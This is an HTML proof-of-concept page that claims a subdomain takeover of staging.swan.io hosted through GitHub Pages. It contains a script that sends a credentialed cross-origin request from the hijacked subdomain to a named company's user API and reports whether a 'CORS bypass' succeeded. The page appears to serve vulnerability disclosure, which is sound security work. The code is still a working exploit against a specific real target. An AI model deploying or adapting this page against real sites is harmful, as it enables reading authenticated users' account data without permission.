<!DOCTYPE html>
<html>
<head><title>Subdomain Takeover PoC</title></head>
<body>
    <h1>🚨 SUBDOMAIN TAKEOVER CONFIRMED</h1>
    <p>Domain: staging.swan.io</p>
    <p>Hosted via: GitHub Pages</p>
    <p>Date: <script>document.write(new Date())</script></p>
    
    <h3>CORS Test</h3>
    <button onclick="testCORS()">Test API Access</button>
    <div id="result"></div>
    
    <script>
    async function testCORS() {
        try {
            const resp = await fetch('https://api.swan.io/user', {
                credentials: 'include',
                headers: {'Origin': 'https://staging.swan.io'}
            });
            document.getElementById('result').innerHTML = 
                `Status: ${resp.status} - ${resp.ok ? 'CORS BYPASS SUCCESS!' : 'Blocked'}`;
        } catch(e) {
            document.getElementById('result').innerHTML = `Error: ${e.message}`;
        }
    }
    </script>
</body>
</html>
